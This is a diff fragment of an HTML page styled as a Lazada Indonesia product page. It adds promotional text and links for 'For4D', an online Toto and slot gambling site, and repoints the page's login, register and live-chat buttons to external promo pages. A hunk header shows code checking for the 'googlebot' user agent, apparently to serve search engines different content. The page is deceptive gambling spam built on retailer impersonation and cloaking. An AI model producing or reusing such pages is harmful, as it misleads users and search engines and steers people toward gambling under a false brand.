+<p>Keunggulan lain dari For4D adalah layanan pelanggan profesional dan responsif, siap membantu selama 24jam, memastikan setiap pemain mendapatkan pengalaman bermain yang nyaman. Metode transaksi yang aman dan cepat, baik melalui Bank lokal hingga E-wallet, semakin mempermudah para pengguna dalam melakukan transaksi deposit maupun penarikan dana. Dengan segala kelebihannya, For4D menjadi pilihan utama bagi para pecinta <a href="https://afroasian-studies.de/">Toto</a> dan Slot Online yang menginginkan keseruan dan keuntungan dalam satu platform resmi terpercaya.</p>
+                                            <a href="https://douberman.dev/amp/amp-afroasian.html" target="_blank" rel="noreferrer noopener">
                                             <div style="text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEih-MNXlLAG__5A9UnNz5gLbxVZC8h9AzoSyHo9-FNGJ8FSsqnV8en-8GqjyHEs2bNEW4TLcscgl8hnzUh8OoNpDkfXPEDBIpycccZXs0y3JdAfJK4T6s1OqwWSArqhXKmFeezw4s52pYD5NFF6N54vUN1eZtnEw4e33jJyNQ7mGzySM2NtZcvZyPogkDjN/s842/For4d%20Baru.gif" alt="FOR4D" style="width: 100%;"></div></a>
                                         <div class="pdp-product-price" bis_skin_checked="1">
                                             <span class="notranslate pdp-price pdp-price_type_normal pdp-price_color_orange pdp-price_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdUG5ius">Rp.5.000</span>
@@ -4069,7 +4068,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                 <li class="footer-li"><a href="//www.lazada.co.id/helpcenter/products-on-lazada/#answer-faq-internationalproduct-ans">Kebijakan Produk Internasional</a></li>
                                 <li class="footer-li"><a href="//www.lazada.co.id/helpcenter/returns-refunds/#answer-faq-return-ans">Cara Pengembalian</a></li>
                                 <li class="--js-csc-trigger">
-                                    <a style="background: #f33636; display: inline-block; color: #6d0f0f; padding: 2px 4px; cursor: pointer;">Ada pertanyaan? Hubungi kami di live chat (24 Jam)</a>
+                                    <a style="background: #f36f36; display: inline-block; color: #0f136d; padding: 2px 4px; cursor: pointer;">Ada pertanyaan? Hubungi kami di live chat (24 Jam)</a>
                                 </li>
                             </ul>
                         </div>
@@ -4507,9 +4506,9 @@ window.onload = function() {
                 display: flex;
                 justify-content: space-around;
                 position: fixed;
-                background: linear-gradient(90deg, #560000 0%, #ff0000 100%) !important;
+                background: linear-gradient(90deg, #535353 0%, #37738f 100%) !important;
                 padding: 5px 0;
-                box-shadow: 0 0 8px 4px #fffb00;
+                box-shadow: 0 0 8px 4px hsl(199, 100%, 72%);
                 left: 0;
                 right: 0;
                 bottom: 0;
@@ -4548,27 +4547,27 @@ window.onload = function() {
             }
         </style>
 <div class="fixed-footer">
-    <a href="https://douberman.dev/amp/amp-sciencebring.html" rel="nofollow noopener" target="_blank">
+    <a href="https://douberman.dev/amp/amp-afroasian.html" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px"
             src="https://myfolder.vip/icon/PROMO.webp" alt="PROMO FOR4D">
         Promosi
     </a>
-    <a href="https://douberman.dev/amp/amp-sciencebring.html" rel="nofollow noopener" target="_blank">
+    <a href="https://douberman.dev/amp/amp-afroasian.html" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px"
             src="https://myfolder.vip/icon/login.png" alt="LOGIN FOR4D">
         Login
     </a>
-    <a href="https://douberman.dev/amp/amp-sciencebring.html" rel="nofollow noopener" target="_blank" class="tada">
+    <a href="https://douberman.dev/amp/amp-afroasian.html" rel="nofollow noopener" target="_blank" class="tada">
         <img layout="intrinsic" height="20px" width="20px"
             src="https://myfolder.vip/icon/daftar.png" alt="DAFTAR FOR4D">
         Daftar
     </a>
-    <a href="https://douberman.dev/amp/amp-sciencebring.html" rel="nofollow noopener" target="_blank">
+    <a href="https://douberman.dev/amp/amp-afroasian.html" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px"
             src="https://myfolder.vip/icon/LINKALTERNATIF.webp" alt="LINK FOR4D">
         Link
     </a>
-    <a href="https://douberman.dev/amp/amp-sciencebring.html" rel="nofollow noopener" target="_blank"
+    <a href="https://douberman.dev/amp/amp-afroasian.html" rel="nofollow noopener" target="_blank"
         class="js_live_chat_link live-chat-link">
         <img class="live-chat-icon" layout="intrinsic" height="20px" width="20px"
             src="https://myfolder.vip/icon/livechat.png" alt="LIVECHAT FOR4D">
